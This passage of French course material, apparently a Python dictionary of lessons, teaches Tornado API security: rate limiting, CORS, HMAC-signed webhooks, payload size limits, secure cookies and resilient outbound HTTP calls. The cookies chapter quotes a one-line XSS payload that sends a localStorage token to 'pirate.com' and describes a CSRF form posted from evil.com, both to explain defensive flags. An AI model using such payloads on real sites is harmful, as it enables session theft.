                ["Impact en cas de fuite", "Limité à quelques minutes", "Élevé, mais neutralisable immédiatement par révocation serveur"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Signer l'`Access Token` et le `Refresh Token` avec exactement la même clé et le même `salt` sans champ `type`",
                "good": "Isoler cryptographiquement les deux jetons via des `salt` distincts (`salt='access-token'` vs `salt='refresh-token'`)",
                "why": "Sans séparation de sel ou de type, un attaquant pourrait envoyer le `Refresh Token` (valable 30 jours) directement dans `Authorization: Bearer` sur les routes métier."
            },
            {
                "bad": "Oublier `@wraps(methode)` de `functools` lors de l'écriture d'un décorateur personnalisé",
                "good": "Toujours décorer la fonction interne `enveloppe` avec `@wraps(methode)`",
                "why": "Préserve le nom exact et les métadonnées d'introspection de la méthode décorée."
            }
        ],
        "practical_exercises": [
            "Implémentez la **rotation complète du Refresh Token** dans `RefreshHandler.post` : chaque fois qu'un `Refresh Token` est utilisé pour obtenir un nouvel `Access Token`, ajoutez immédiatement l'ancien `jti` dans `REFRESH_TOKENS_REVOQUES` et renvoyez à la fois un nouvel `Access Token` et un nouveau `Refresh Token`.",
            "Enrichissez le décorateur `@exiger_acces` pour qu'il injecte automatiquement le dictionnaire décodé dans `self.current_user`."
        ]
    },

    # =========================================================================
    # JOUR 4 — CHAPITRE 4.5 : LIMITATION DE DÉBIT (RATE LIMITING / 429) & QUOTAS
    # =========================================================================
    "d4-l5": {
        "context": (
            "Même une API parfaitement authentifiée reste vulnérable sur le plan de sa **disponibilité** et de ses **coûts financiers** :\n"
            "- Un attaquant peut lancer une attaque par force brute sur `POST /api/auth/login` en testant 10 000 mots de passe par minute.\n"
            "- Un développeur partenaire peut commettre une erreur de programmation (`while True:` sans pause) et bombarder votre serveur "
            "de 5 000 requêtes par seconde, saturant l'`IOLoop` et la base de données pour tous les autres clients légitimes (**Déni de Service — DoS**).\n"
            "La **limitation de débit (`Rate Limiting`)** dans la méthode `prepare(self)` d'un `RequestHandler` Tornado impose un quota "
            "maximal de requêtes par fenêtre de temps et répond avec le code standard **`429 Too Many Requests`**."
        ),
        "deep_sections": [
            {
                "heading": "1. Comparaison des algorithmes industriels : Fixed Window vs Sliding Window Log vs Token Bucket",
                "body": (
                    "Il existe trois grandes familles d'algorithmes pour compter et réguler le trafic d'une API :\n"
                    "1. **Fenêtre Fixe (*Fixed Window Counter*)** : On découpe le temps en tranches fixes (ex: `14h00-14h01`, `14h01-14h02`) avec un simple compteur. "
                    "*Défaut majeur (Effet de bord aux frontières)* : Si la limite est de 100 req/min, un client peut envoyer 100 requêtes à `14h00m59s` "
                    "et 100 autres à `14h01m01s`, soit **200 requêtes en 2 secondes**, doublant la charge autorisée !\n"
                    "2. **Journal à Fenêtre Glissante (*Sliding Window Log* — implémenté dans notre laboratoire)** : Pour chaque client, on conserve "
                    "la liste des horodatages exacts (`time.time()`) de ses requêtes récentes. Lorsqu'une nouvelle requête arrive à l'instant `T` dans `prepare(self)`, "
                    "on purge toutes les entrées antérieures à `T - 20s`. Si le nombre d'entrées restantes atteint le quota, on rejette la requête via `self.finish(...)`. "
                    "Cet algorithme est **mathématiquement exact** et élimine tout effet de pointe aux frontières de minutes.\n"
                    "3. **Seau à Jetons (*Token Bucket* — utilisé par AWS API Gateway et NGINX)** : Chaque client possède un seau virtuel contenant au "
                    "maximum `B` jetons (capacité de rafale / *burst*), qui se remplit à un rythme constant de `R` jetons par seconde."
                )
            },
            {
                "heading": "2. Les en-têtes HTTP de transparence : `X-RateLimit-*` et `Retry-After` (RFC 6585)",
                "body": (
                    "Un bon limiteur de débit ne se contente pas de bloquer brutalement le client : il lui communique en permanence l'état "
                    "de son quota dans les **en-têtes de réponse HTTP** via `self.set_header(...)` :\n"
                    "- `X-RateLimit-Limit: 3` : Le plafond maximal autorisé sur la fenêtre temporelle.\n"
                    "- `X-RateLimit-Remaining: 2` : Le nombre de requêtes qu'il reste au client avant blocage.\n"
                    "- `Retry-After: 18` (Obligatoire sur une réponse `429 Too Many Requests`) : Indique exactement au script client combien de "
                    "secondes il doit patienter (`time.sleep(18)`) avant de réessayer sa requête."
                )
            },
            {
                "heading": "3. Quelle clé d'identification choisir dans Tornado ? (`self.request.remote_ip` vs `X-API-Key`)",
                "body": (
                    "Identifier l'appelant pour appliquer le quota demande de la nuance :\n"
                    "- **Sur les routes publiques non authentifiées (`/api/login`, `/api/catalogue`)** : On utilise l'adresse IP du client (`self.request.remote_ip`, "
                    "automatiquement renseignée depuis `X-Forwarded-For` lorsque `HTTPServer(app, xheaders=True)` est placé derrière un proxy inverse Nginx).\n"
                    "- **Sur les routes authentifiées** : Il est beaucoup plus juste et précis d'indexer le compteur sur l'identifiant du client authentifié "
                    "(`X-API-Key` ou `sub` du jeton Bearer), ce qui permet d'offrir des quotas différenciés selon l'abonnement."
                )
            }
        ],
        "architecture_diagram": (
            "ALGORITHME DE FENÊTRE GLISSANTE DANS PREPARE(SELF) (QUOTA = 3 REQ / 20s)\n"
            "========================================================================\n\n"
            "  Instant actuel : T = 100.0s  |  Fenêtre active : [80.0s ---> 100.0s]\n\n"
            "  Historique du client avant nettoyage : [ 65.0s,  85.0s,  90.0s,  96.0s ]\n"
            "                                           ^^^^^\n"
            "  1. Purge des entrées < 80.0s         : Exclut 65.0s -> Reste [ 85.0s, 90.0s, 96.0s ] (Taille = 3)\n"
            "  2. Vérification (Taille >= Quota 3)  : QUOTA ATTEINT !\n"
            "  3. Calcul de Retry-After             : 20 - (100.0 - 85.0) = 5 secondes\n"
            "  4. Réponse Tornado (self.finish)     : 429 Too Many Requests (Header Retry-After: 5)"
        ),
        "reference_table": {
            "title": "En-têtes HTTP Standards de Limitation de Débit (`Rate Limiting`)",
            "headers": ["En-tête HTTP / Code", "Valeur Exemple", "Présence", "Signification pour le Client Consommateur"],
            "rows": [
                ["Code `429 Too Many Requests`", "`429`", "Uniquement lors du dépassement", "La requête est refusée temporairement pour cause de dépassement de cadence"],
                ["`X-RateLimit-Limit`", "`3`", "Sur toutes les réponses (`200` et `429`)", "Plafond maximal de requêtes autorisées par fenêtre"],
                ["`X-RateLimit-Remaining`", "`0` à `3`", "Sur toutes les réponses (`200` et `429`)", "Nombre d'appels restants avant déclenchement du `429`"],
                ["`Retry-After`", "`15`", "Sur toutes les réponses `429`", "Délai exact en secondes à attendre avant la prochaine tentative"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Renvoyer `500 Internal Server Error` ou `403 Forbidden` lorsqu'un client dépasse sa cadence d'appel",
                "good": "Utiliser le code sémantique dédié `429 Too Many Requests` accompagné de l'en-tête `Retry-After`",
                "why": "Avec `429` et `Retry-After`, les SDK clients savent qu'il s'agit d'une limite temporaire et mettent automatiquement leurs appels en pause."
            },
            {
                "bad": "En production multi-instances (4 instances Tornado), stocker uniquement le compteur en RAM Python locale",
                "good": "En production distribuée, centraliser les compteurs dans un store partagé atomique comme **Redis** ou `limit_req_zone` de Nginx",
                "why": "Chaque processus Tornado ayant sa propre mémoire RAM isolée, un compteur en mémoire locale permettrait au client d'effectuer `4 x Quota` requêtes."
            }
        ],
        "practical_exercises": [
            "Adaptez l'algorithme de Rate Limiting du chapitre pour appliquer un **quota différencié par niveau d'abonnement** : `5 requêtes/min` si l'en-tête `X-Plan` vaut `standard`, et `20 requêtes/min` s'il vaut `premium`.",
            "Ajoutez un nettoyage périodique automatique des clés clientes inactives depuis plus de 60 secondes afin que le dictionnaire `HISTORIQUE_REQUETES` ne grossisse pas indéfiniment en mémoire."
        ]
    },

    # =========================================================================
    # JOUR 4 — CHAPITRE 4.6 : SÉCURITÉ PÉRIMÉTRIQUE : CORS, SIGNATURES WEBHOOK HMAC & TAILLE MAXIMALE (413)
    # =========================================================================
    "d4-l6": {
        "context": (
            "Pour compléter la sécurité périmétrique de notre API Tornado, nous abordons trois mécanismes que tout "
            "architecte d'API rencontre dès la mise en production :\n"
            "1. **La politique `CORS` (*Cross-Origin Resource Sharing*)** : Pourquoi votre API fonctionne-t-elle parfaitement "
            "dans `curl` ou Postman, mais échoue immédiatement avec une erreur rouge dans la console dès qu'une application "
            "React ou Vue.js tente de l'appeler depuis un navigateur Web ?\n"
            "2. **La vérification cryptographique des `Webhooks` (`HMAC-SHA256`)** : Lorsqu'un prestataire de paiement (Stripe, "
            "Chargily, PayPal) ou GitHub appelle votre API pour vous notifier d'un paiement réussi, comment être certain "
            "à 100% que l'appel provient bien du partenaire et non d'un pirate qui simule un paiement ?\n"
            "3. **La protection mémoire contre les charges géantes (`413 Payload Too Large`)** : Comment empêcher un client "
            "d'envoyer un JSON géant qui sature la mémoire RAM du serveur ?"
        ),
        "deep_sections": [
            {
                "heading": "1. Comprendre `CORS` (*Cross-Origin Resource Sharing*) et la méthode `def options(self)` dans Tornado",
                "body": (
                    "Par défaut, tous les navigateurs Web (Chrome, Firefox, Safari) appliquent une règle de sécurité stricte appelée "
                    "**SOP (*Same-Origin Policy* / Politique de même origine)** : un script JavaScript exécuté sur le domaine "
                    "`https://portail.isgp.dz` n'a le droit de lire les réponses d'une API que si elle est hébergée sur la **même origine** "
                    "(même protocole + même domaine + même port).\n"
                    "- Si votre frontal React tourne sur `http://localhost:3000` (ou `https://portail.isgp.dz`) et appelle votre API Tornado sur "
                    "`http://localhost:8888` (ou `https://api.isgp.dz`), les origines diffèrent : le navigateur bloque la lecture de la réponse, "
                    "**sauf si le `RequestHandler` Tornado inclut explicitement les en-têtes `Access-Control-Allow-Origin` dans `set_default_headers(self)`**.\n"
                    "- **La requête de pré-vérification (`Preflight OPTIONS` -> `def options(self)`)** : Avant d'envoyer une requête `POST`, `PUT`, `DELETE` "
                    "avec `Content-Type: application/json` ou `Authorization`, le navigateur envoie automatiquement une requête `OPTIONS` "
                    "à laquelle Tornado répond `204 No Content` dans `def options(self)`."
                )
            },
            {
                "heading": "2. Architecture inversée (`Webhooks`) et signature `HMAC-SHA256` sur octets bruts (`self.request.body`)",
                "body": (
                    "Au lieu que votre serveur interroge une API externe toutes les 5 secondes pour savoir si un étudiant a payé ses frais "
                    "d'inscription (*Polling* inefficace), le prestataire de paiement envoie lui-même une requête `POST /api/webhooks/paiement` "
                    "à votre serveur dès que la transaction aboutit : c'est un **Webhook** (un rappel HTTP serveur-à-serveur).\n"
                    "- **Le risque** : L'URL `/api/webhooks/paiement` étant accessible sur Internet, n'importe qui pourrait envoyer "
                    "`{\"evenement\": \"paiement.reussi\", \"montant\": 50000}` avec `curl` pour valider frauduleusement sa commande.\n"
                    "- **La parade industrielle (`X-Webhook-Signature`)** : Vous partagez un secret unique (`WEBHOOK_SECRET`) avec le prestataire. "
                    "Avant d'envoyer le JSON, le prestataire calcule le `HMAC-SHA256` des **octets bruts exacts** du corps HTTP avec ce secret et "
                    "l'inscrit dans l'en-tête `X-Webhook-Signature`.\n"
                    "- **Règle d'or dans Tornado** : Vous devez calculer le HMAC sur **`self.request.body`** (les octets bruts `bytes` tels qu'ils ont circulé "
                    "sur le réseau) et **JAMAIS** sur un dictionnaire re-sérialisé par `json.dumps()`."
                )
            },
            {
                "heading": "3. Protection de la mémoire vive contre les charges géantes (`413 Payload Too Large` / `max_body_size`)",
                "body": (
                    "Lorsque Tornado lit une requête HTTP, il charge le corps de la requête dans `self.request.body`.\n"
                    "- En configurant `max_body_size` sur `tornado.httpserver.HTTPServer` et en vérifiant `len(self.request.body) > TAILLE_MAX_OCTETS` "
                    "dans `prepare(self)`, vous interrompez immédiatement le traitement avec **`413 Payload Too Large`** avant toute désérialisation coûteuse."
                )
            }
        ],
        "architecture_diagram": (
            "DOUBLE MÉCANISME : PREFLIGHT CORS (NAVIGATEUR) & SIGNATURE HMAC (WEBHOOK)\n"
            "=========================================================================\n\n"
            "  [A] PRÉ-VÉRIFICATION CORS PAR LE NAVIGATEUR WEB :\n"
            "  Navigateur (https://portail.isgp.dz)             Serveur Tornado (https://api.isgp.dz)\n"
            "  1. OPTIONS /api/formations               ----->  def options(self) vérifie ORIGINES_AUTORISEES\n"
            "     Origin: https://portail.isgp.dz       <-----  204 No Content + Access-Control-Allow-Origin\n"
            "  2. POST /api/formations (+ JSON + Auth)  ----->  def post(self) -> 201 Created\n\n"
            "  [B] VÉRIFICATION CRYPTOGRAPHIQUE D'UN WEBHOOK DE PAIEMENT :\n"
            "  Serveur de Paiement                              Serveur API Tornado\n"
            "  Corps brut : b'{\"id\":101,\"statut\":\"paye\"}'       corps_brut = self.request.body\n"
            "  Header X-Webhook-Signature: sha256=9f8a.. -----> Attendu = HMAC(WEBHOOK_SECRET, corps_brut)\n"
            "                                                   hmac.compare_digest(Recu, Attendu) -> 200 OK"
        ),
        "reference_table": {
            "title": "Mécanismes de Sécurité Périmétrique (`CORS`, `Webhooks`, `413 Payload Too Large`)",
            "headers": ["Mécanisme Périmétrique", "En-têtes HTTP Impliqués", "Code HTTP d'Erreur", "Menace Neutralisée"],
            "rows": [
                ["Politique `CORS` stricte", "`Origin`, `Access-Control-Allow-Origin`, `Access-Control-Allow-Headers`", "Blocage côté navigateur", "Appel malveillant de l'API depuis un site tiers non autorisé"],
                ["Signature de Webhook `HMAC`", "`X-Webhook-Signature` (ex: `sha256=...`)", "`401 Unauthorized`", "Falsification d'événements asynchrones (faux paiements, faux statuts)"],
                ["Plafond de taille du Body", "`Content-Length`", "`413 Payload Too Large`", "Saturation de la mémoire vive (RAM) par envoi de charges géantes"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Configurer `Access-Control-Allow-Origin: *` (joker universel) sur une API privée",
                "good": "Maintenir une **liste blanche explicite** des domaines frontaux autorisés (`https://portail.isgp.dz`)",
                "why": "Le joker `*` autorise n'importe quel site Internet visité par l'utilisateur à interroger l'API depuis son navigateur."
            },
            {
                "bad": "Calculer le HMAC d'un Webhook après avoir parsé le JSON (`json.dumps(json_decode(self.request.body))`)",
                "good": "Calculer systématiquement le HMAC sur la séquence d'octets brute exacte `self.request.body`",
                "why": "Un seul espace ou retour à la ligne différent entre le formateur JSON de l'émetteur et celui de Python modifie totalement le hash SHA-256."
            }
        ],
        "practical_exercises": [
            "Exécutez `day_4/05_cors_webhooks_headers.py` pour observer le pré-vol CORS (`OPTIONS`), la validation HMAC d'un Webhook et le rejet `413 Payload Too Large`.",
            "Ajoutez la protection contre les **attaques par rejeu (*Replay Attacks*)** sur le Webhook : exigez un en-tête `X-Webhook-Timestamp`, incluez-le dans le calcul HMAC (`timestamp + \".\" + body`), et rejetez tout Webhook dont l'horodatage a plus de 5 minutes d'écart avec l'heure actuelle."
        ]
    },

    # =========================================================================
    # JOUR 4 — CHAPITRE 4.7 : GESTION ET SÉCURITÉ DES COOKIES DANS TORNADO (HTTPONLY, SECURE, SAMESITE, SET_SECURE_COOKIE)
    # =========================================================================
    "d4-l7": {
        "context": (
            "Dans une architecture Web et API moderne, une question de sécurité critique revient dans chaque audit : "
            "**où le navigateur doit-il conserver le jeton d'accès ou l'identifiant de session de l'utilisateur ?**\n"
            "Pendant longtemps, de nombreux tutoriels conseillaient de stocker le JWT dans `window.localStorage` en JavaScript. "
            "Or, l'OWASP déconseille formellement `localStorage` pour les secrets sensibles : à la moindre faille **XSS (*Cross-Site Scripting*)**, "
            "une seule ligne de JavaScript injectée (`fetch('https://pirate.com?t=' + localStorage.getItem('token'))`) vole instantanément "
            "les jetons de tous les utilisateurs connectés.\n"
            "Ce chapitre enseigne l'ingénierie industrielle des **Cookies HTTP sécurisés (`Set-Cookie` / `Cookie`)**, des **Cookies Signés "
            "Horodatés natifs de Tornado (`self.set_secure_cookie` / `self.get_secure_cookie` avec `cookie_secret`)** et des trois drapeaux de "
            "défense périmétrique : **`HttpOnly`**, **`Secure`** et **`SameSite`**."
        ),
        "deep_sections": [
            {
                "heading": "1. Anatomie du cycle `Set-Cookie` (Serveur -> Client) et `Cookie` (Client -> Serveur) dans Tornado",
                "body": (
                    "Contrairement à l'en-tête `Authorization: Bearer ...` que le code JavaScript doit ajouter manuellement sur chaque `fetch()`, "
                    "les **Cookies HTTP (RFC 6265)** sont gérés automatiquement par le moteur réseau du navigateur :\n"
                    "1. **Émission (`Set-Cookie`)** : Lors de la réponse à `POST /api/auth/cookie-login`, le `RequestHandler` Tornado appelle "
                    "`self.set_secure_cookie(\"isgp_session\", valeur, expires_days=1, httponly=True, secure=True, samesite=\"Strict\")`.\n"
                    "2. **Transport automatique (`Cookie`)** : À chaque requête suivante vers ce domaine, le navigateur joint automatiquement "
                    "l'en-tête `Cookie: isgp_session=...; isgp_theme=sombre`. Côté Tornado, on les lit avec **`self.get_secure_cookie(\"isgp_session\")`** et **`self.get_cookie(\"isgp_theme\")`**.\n"
                    "3. **Révocation (`clear_cookie`)** : Lors du `POST /api/auth/cookie-logout`, `self.clear_cookie(\"isgp_session\")` "
                    "émet un en-tête `Set-Cookie` avec une date d'expiration dans le passé, ordonnant au navigateur de détruire immédiatement le cookie."
                )
            },
            {
                "heading": "2. Les 3 Drapeaux de Sécurité Obligatoires : `HttpOnly` (Anti-XSS), `Secure` (HTTPS), `SameSite` (Anti-CSRF)",
                "body": (
                    "Un cookie transportant une session ou un jeton d'API ne doit **jamais** être émis sans ses trois attributs de blindage :\n"
                    "- **`HttpOnly` (`httponly=True` -> Protection contre le vol par XSS)** : Indique au navigateur que ce cookie est réservé exclusivement "
                    "au protocole HTTP. Toute tentative de lecture par JavaScript via `document.cookie` renvoie une chaîne vide ! Un script XSS injecté "
                    "ne peut donc pas exfiltrer la valeur du cookie.\n"
                    "- **`Secure` (`secure=True` -> Protection contre l'écoute réseau *Man-in-the-Middle*)** : Interdit au navigateur d'envoyer le cookie "
                    "sur une connexion HTTP non chiffrée ; il n'est transmis que sur **HTTPS (TLS)**.\n"
                    "- **`SameSite` (`samesite=\"Strict\"` ou `\"Lax\"` -> Protection contre les attaques CSRF)** :\n"
                    "  - Dans une attaque **CSRF (*Cross-Site Request Forgery*)**, un utilisateur connecté à votre banque visite un site piégé `evil.com` "
                    "qui soumet en cachette un formulaire `<form action=\"https://votre-api.dz/virement\" method=\"POST\">`.\n"
                    "  - Avec **`SameSite=Strict`**, le navigateur refuse catégoriquement d'attacher le cookie si la requête provient d'un site externe."
                )
            },
            {
                "heading": "3. Cookie Standard en Clair (`self.set_cookie`) vs Cookie Signé Horodaté Tornado (`self.set_secure_cookie`)",
                "body": (
                    "Il est crucial de distinguer les deux méthodes natives de Tornado :\n"
                    "- **Le Cookie standard (`self.set_cookie(\"isgp_theme\", \"sombre\")` / `self.get_cookie`)** : Sa valeur est brute et non signée. N'importe quel "
                    "utilisateur peut ouvrir l'inspecteur de stockage (F12) et modifier la valeur. Ne l'utilisez **que** pour des préférences d'affichage "
                    "(thème clair/sombre, langue).\n"
                    "- **Le Cookie Signé Tornado (`self.set_secure_cookie` / `self.get_secure_cookie`)** : Dès que vous configurez `cookie_secret` sur "
                    "`tornado.web.Application`, Tornado encode la valeur en Base64, y attache un horodatage Unix et signe le tout par **HMAC-SHA256** "
                    "(format v2 : `2|1:0|10:timestamp|...|<signature_hmac>`). Si un client tente de modifier un seul caractère du cookie dans F12 pour "
                    "s'attribuer le rôle `admin`, la vérification HMAC échoue et `self.get_secure_cookie()` renvoie proprement **`None`** !"
                )
            }
        ],
        "architecture_diagram": (
            "ARCHITECTURE DE SÉCURITÉ DES COOKIES TORNADO : HTTPONLY + SAMESITE + SET_SECURE_COOKIE\n"
            "======================================================================================\n\n"
            "  Serveur Tornado (POST /api/auth/cookie-login)\n"
            "       |\n"
            "       |  self.set_secure_cookie('isgp_session', ..., httponly=True, secure=True, samesite='Strict')\n"
            "       v\n"
            "  +-----------------------------------------------------------------------------+\n"
            "  | Coffre-Fort Réseau du Navigateur (Isolé du DOM JavaScript)                  |\n"
            "  |                                                                             |\n"
            "  |  1. Script XSS malveillant appelle document.cookie  ---> BLOQUÉ (HttpOnly)  |\n"
            "  |  2. Site tiers evil.com tente un POST CSRF          ---> BLOQUÉ (SameSite)  |\n"
            "  |  3. Connexion non chiffrée http://                  ---> BLOQUÉ (Secure)    |\n"
            "  +-----------------------------------------------------------------------------+\n"
            "       |\n"
            "       |  Requête légitime même origine : Cookie: isgp_session=\"2|1:0|...\"\n"
            "       v\n"
            "  Serveur Tornado : self.get_secure_cookie('isgp_session') vérifie HMAC (cookie_secret) ---> 200 OK"
        ),
        "reference_table": {
            "title": "Matrice de Sécurité des Attributs d'un Cookie HTTP dans Tornado",
            "headers": ["Attribut / Méthode", "Paramètre Tornado", "Attaque Neutralisée", "Comportement du Navigateur / Serveur"],
            "rows": [
                ["`HttpOnly`", "`httponly=True`", "**XSS** (*Cross-Site Scripting* — vol de jeton via JS)", "Rend le cookie totalement invisible pour `document.cookie` en JavaScript"],
                ["`Secure`", "`secure=True`", "**Sniffing réseau / MitM** sur Wi-Fi public", "Ne transmet le cookie que sur un canal chiffré `https://`"],
                ["`SameSite=Strict` / `Lax`", "`samesite=\"Strict\"` ou `\"Lax\"`", "**CSRF** (*Cross-Site Request Forgery*)", "Interdit l'envoi automatique du cookie lors de requêtes `POST` déclenchées depuis un site tiers"],
                ["`clear_cookie`", "`self.clear_cookie(\"isgp_session\")`", "Persistance infinie sur un poste partagé", "Ordonne au navigateur de supprimer immédiatement le cookie"],
                ["Signature HMAC (`set_secure_cookie`)", "`cookie_secret=os.environ[...]`", "**Falsification client** (élévation de privilèges dans F12)", "Toute modification d'un octet du cookie fait que `get_secure_cookie()` retourne `None`"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Stocker le rôle en clair dans un cookie non signé (`self.set_cookie('role', 'admin')`) et lui faire confiance",
                "good": "Toujours signer cryptographiquement les cookies d'identité via `self.set_secure_cookie` avec `cookie_secret`",
                "why": "Un cookie non signé est un simple texte que l'utilisateur peut modifier en 5 secondes dans les outils de développement (F12) de son navigateur."
            },
            {
                "bad": "Oublier `httponly=True` sur un cookie contenant un jeton JWT ou une session signée",
                "good": "Activer systématiquement `httponly=True` lors de l'appel à `self.set_secure_cookie`",
                "why": "Sans `HttpOnly`, n'importe quel script JavaScript tiers chargé dans la page peut lire `document.cookie` et dérober la session."
            }
        ],
        "practical_exercises": [
            "Dans le Client HTTP ou avec `curl -i -X POST http://127.0.0.1:8888/api/sandbox/cookies/login`, inspectez les en-têtes `Set-Cookie` retournés par Tornado et vérifiez la présence de `HttpOnly` et `SameSite`.",
            "Appelez ensuite `GET /api/sandbox/cookies/inspect` puis `POST /api/sandbox/cookies/logout` pour observer le cycle complet d'émission, de vérification HMAC et de révocation."
        ]
    },

    # =========================================================================
    # JOUR 5 — CHAPITRE 5.1 : CONSOMMER UNE API TIERCE (ASYNCHTTPCLIENT RÉSILIENT, TIMEOUTS & RETRIES)
    # =========================================================================
    "d5-l1": {
        "context": (
            "Jusqu'ici, votre serveur Tornado répondait directement aux clients à partir de ses propres données. "
            "Mais dans une architecture d'entreprise réelle (**Microservices** ou **Système d'Information distribué**), "
            "votre API doit très souvent **devenir elle-même cliente d'autres APIs** pendant le traitement d'une requête : "
            "interroger l'API de la Banque Centrale pour un taux de change, vérifier un numéro d'identification fiscal "
            "auprès d'un service gouvernemental, ou déclencher l'envoi d'un e-mail transactionnel.\n"
            "Or, dans un serveur asynchrone comme Tornado, appeler `urllib.request.urlopen()` ou `requests.get()` de manière synchrone "
            "sans `timeout` **fige l'intégralité de l'Event-Loop (`IOLoop`)** pour tous les utilisateurs connectés ! "
            "Ce chapitre enseigne l'utilisation du client natif non bloquant **`tornado.httpclient.AsyncHTTPClient`** avec "
            "`request_timeout` et recul exponentiel (`Exponential Backoff`)."
        ),
        "deep_sections": [
            {
                "heading": "1. Anatomie d'une panne en cascade (*Cascading Failure*) et obligation vitale d'`AsyncHTTPClient` + `timeout`",
                "body": (
                    "Comprenons mécaniquement pourquoi un appel HTTP sortant synchrone ou sans `timeout` est fatal sur une boucle d'événements :\n"
                    "- Tornado traite toutes les connexions concurrentes sur sa boucle d'événements **`IOLoop`**.\n"
                    "- Si une méthode `get(self)` utilise un appel bloquant (`requests.get(url)` sans `await`) ou sans `timeout` vers un partenaire "
                    "qui met 30 secondes à répondre, la boucle d'événements est bloquée.\n"
                    "- En déclarant **`async def get(self):`** et en utilisant **`await tornado.httpclient.AsyncHTTPClient().fetch(req)`** avec "
                    "`connect_timeout=2.0` et `request_timeout=3.0`, Tornado suspend uniquement cette coroutine pendant l'attente réseau et "
                    "continue de servir des milliers d'autres requêtes en parallèle !"
                )
            },
            {
                "heading": "2. Stratégie de réessai intelligent (`Retry`) avec recul exponentiel non bloquant (`await asyncio.sleep`)",
                "body": (
                    "Que doit faire votre serveur Tornado lorsqu'un appel vers une API partenaire échoue ? Il faut distinguer deux cas :\n"
                    "1. **Erreur cliente (`400`, `401`, `403`, `404`, `422`)** : **Ne jamais réessayer immédiatement**. La requête est mal "
                    "formulée ou non autorisée ; la renvoyer 3 fois donnera 3 fois la même erreur.\n"
                    "2. **Erreur transitoire réseau ou serveur (`Timeout`, `502`, `503`, `504`)** : Il s'agit souvent d'une micro-coupure "
                    "réseau de 100 millisecondes. On applique alors une boucle de **Retry avec Exponential Backoff** en utilisant "
                    "**`await asyncio.sleep(delai)`** (et jamais `time.sleep()` qui bloquerait l'`IOLoop` !).\n"
                    "3. **Traduction sémantique pour le client final (`502` vs `504`)** : Si les 3 tentatives échouent, votre API renvoie :\n"
                    "   - **`504 Gateway Timeout`** si le serveur partenaire a dépassé le délai imparti.\n"
                    "   - **`502 Bad Gateway`** si le serveur partenaire a renvoyé une réponse invalide ou une erreur `5xx`."
                )
            },
            {
                "heading": "3. `tornado.httpclient.AsyncHTTPClient` vs `urllib.request` / `httpx`",
                "body": (
                    "En Python/Tornado, deux contextes d'utilisation coexistent :\n"
                    "- **À l'intérieur d'un `RequestHandler` Tornado (`async def get(self):`)** : Utilisez toujours **`tornado.httpclient.AsyncHTTPClient()`** "
                    "(ou `httpx.AsyncClient()`), qui s'intègre nativement à l'`IOLoop` sans bloquer le thread principal.\n"
                    "- **Dans un script CLI autonome hors serveur** : `urllib.request.urlopen(..., timeout=5.0)` ou `requests` permet d'interroger "
                    "l'API simplement avec un timeout explicite."
                )
            }
        ],
        "architecture_diagram": (
            "ARCHITECTURE D'UN APPEL SORTANT NON BLOQUANT (ASYNCHTTPCLIENT + RETRY BACKOFF)\n"
            "==============================================================================\n\n"
            "  Client Mobile          Votre API Tornado (Async Handler)       API Partenaire Externe\n"
            "       |                              |                                    |\n"
            "       |--- GET /api/devises -------->|                                    |\n"
            "       |                              |--- Essai 1 (request_timeout=2s) -->|\n"
            "       |                              |<-- [HTTP 503 / Timeout] -----------X\n"
            "       |                              |    await asyncio.sleep(0.2s)       |\n"
            "       |                              |--- Essai 2 (request_timeout=2s) -->|\n"
            "       |                              |<-- 200 OK (Taux EUR/DZD) ----------|\n"
            "       |<-- 200 OK (Enrichi) ---------|                                    |\n\n"
            "  (Si les 3 essais échouent par Timeout ---> Votre API répond 504 Gateway Timeout)"
        ),
        "reference_table": {
            "title": "Matrice de Gestion des Pannes lors d'un Appel HTTP vers un Partenaire Externe",
            "headers": ["Situation Rencontrée en Aval (Partenaire)", "Code / Exception Tornado", "Faut-il Réessayer (`Retry`) ?", "Code HTTP Renvoyé par Votre API"],
            "rows": [
                ["Partenaire répond `200 OK` avec JSON valide", "`resp.code == 200`", "Non (Succès immédiat)", "`200 OK`"],
                ["Partenaire ne répond pas dans `request_timeout`", "`HTTPClientError(599)` / `TimeoutError`", "Oui (2 à 3 fois max avec Backoff)", "`504 Gateway Timeout` (ou `200` dégradé avec cache)"],
                ["Partenaire répond `500`, `502` ou `503`", "`resp.code >= 500`", "Oui (Erreur transitoire serveur)", "`502 Bad Gateway`"],
                ["Partenaire répond `400`, `401`, `403` ou `404`", "`400 <= resp.code < 500`", "Non (Échec déterministe immédiat)", "`502 Bad Gateway` (ou code métier approprié)"],
                ["Partenaire renvoie du HTML au lieu de JSON", "`json.JSONDecodeError`", "Non", "`502 Bad Gateway`"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Appeler `time.sleep(2)` ou `requests.get(url)` de manière synchrone à l'intérieur d'un `RequestHandler` Tornado",
                "good": "Utiliser `async def get(self):`, `await AsyncHTTPClient().fetch(req)` et `await asyncio.sleep(...)`",
                "why": "Un appel bloquant gèle l'`IOLoop` Tornado et bloque toutes les autres requêtes concurrentes du processus."
            },
            {
                "bad": "Faire un `Retry` automatique sur une opération de paiement (`POST`) sans clé d'idempotence",
                "good": "Ne réessayer automatiquement que les requêtes idempotentes (`GET`, `PUT`, `DELETE`) ou munies d'une `Idempotency-Key`",
                "why": "Si la 1re requête avait abouti mais que seule la réponse s'est perdue sur le réseau, réessayer un `POST` non idempotent exécute l'opération deux fois."
            }
        ],
        "practical_exercises": [
            "Exécutez `day_5/01_client_python_auth.py` pour observer comment `AsyncHTTPClient` absorbe deux pannes `503` transitoires grâce au recul exponentiel avant de réussir à la 3e tentative.",
            "Implémentez un disjoncteur simple (**Circuit Breaker**) : si 5 appels consécutifs vers le partenaire échouent, ouvrez le circuit pendant 30 secondes pour échouer instantanément."
        ]
    },

    # =========================================================================
    # JOUR 5 — CHAPITRE 5.2 : ARCHITECTURE MODULAIRE, SOUS-TABLES DE ROUTAGE & CYCLE DE VIE API (/api/v1 vs /api/v2)
    # =========================================================================
    "d5-l2": {
        "context": (
            "Deux questions fondamentales se posent dès qu'une API dépasse le stade du prototype :\n"
            "1. **Comment organiser 150 `RequestHandlers` en Python sans transformer `app.py` en un fichier illisible de 6 000 lignes** ?\n"
            "2. **Pourquoi voit-on presque toujours `/api/v1/...` dans les APIs mondiales (OpenAI `/v1/`, Stripe `/v1/`, Kubernetes `/v1`) "
